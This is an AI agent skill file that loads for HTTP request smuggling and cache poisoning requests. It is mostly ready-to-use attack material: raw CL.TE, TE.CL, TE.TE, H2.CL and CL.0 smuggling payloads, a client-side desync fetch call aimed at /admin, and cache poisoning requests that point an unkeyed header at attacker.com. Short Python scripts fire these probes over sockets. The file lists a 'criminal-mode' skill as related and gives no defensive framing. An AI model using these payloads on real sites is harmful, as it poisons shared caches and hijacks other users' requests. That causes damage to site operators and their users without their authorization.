---
name: smuggling-tools
description: "HTTP smuggling & cache poisoning — CL.TE, TE.CL, TE.TE, H2.CL, desync, cache key."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [smuggling, cache-poisoning, desync, cl-te, request-smuggling]
    related_skills: [criminal-mode, exploit-tools, biz-logic-tools]
prerequisites:
  commands: [python]
---

# HTTP Smuggling & Cache Poisoning Tools

## When to Load This Skill

User requests:
- "HTTP smuggling", "cache poisoning", "desync", "CL.TE", "TE.CL"

---

## HTTP Request Smuggling

### CL.TE (Content-Length wins front-end, Transfer-Encoding wins back-end)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Transfer-Encoding wins front-end, Content-Length wins back-end)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### TE.TE (Both support TE, obfuscation)
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED
```

### HTTP/2 (H2.CL, H2.TE)
```http
:method: POST
:path: /
:authority: target.com
content-length: 0

SMUGGLED
```

---

## Cache Poisoning

### Unkeyed Header
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If cached, all users get attacker.com response
```

### Cache Key Injection
```http
GET /?param=1 HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Response: 301 to https
# Cached for all users
```

### Web Cache Deception
```http
GET /profile/nonexistent.css HTTP/1.1
Host: target.com

# If cached, attacker can access /profile content
```

### Fat GET
```http
GET /?param=value HTTP/1.1
Host: target.com
Content-Length: 30

param=evil
```

---

## Desync Attacks

### CL.0
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

### Client-Side Desync
```javascript
fetch('https://target.com/', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    mode: 'no-cors'
});
```

---

## Python Smuggling Tools

### Smuggling Tester

```python
import socket

def test_cl_te(host, port, payload):
    s = socket.socket()
    s.connect((host, port))
    s.send(payload)
    response = s.recv(4096)
    s.close()
    return response

CL_TE = b"""POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED"""
```

### Cache Poison Tester

```python
import requests

def test_cache_poison(url, header_name, header_value):
    headers = {header_name: header_value}
    r = requests.get(url, headers=headers)
    
    # Check if poisoned response is cached
    r2 = requests.get(url)
    
    return {
        'first_response': r.text[:200],
        'second_response': r2.text[:200],
        'cached': r.text == r2.text
    }
```

### Desync Detector

```python
import socket
import time

def detect_desync(host, port):
    # Send request with timeout
    s = socket.socket()
    s.settimeout(5)
    s.connect((host, port))
    
    # CL.TE probe
    payload = b"POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
    s.send(payload)
    
    try:
        response = s.recv(4096)
        time.sleep(1)
        response2 = s.recv(4096)
        if response2:
            return {'desync': True, 'response': response2}
    except:
        pass
    
    s.close()
    return {'desync': False}
```

---

## Output Format

```json
{
  "url": "https://target.com",
  "smuggling": {
    "type": "CL.TE",
    "vulnerable": true,
    "smuggled_request": "GET /admin HTTP/1.1"
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection closed | Server rejects | Try different technique |
| Timeout | No desync | Try other variant |
| 400 Bad Request | Malformed | Adjust payload |
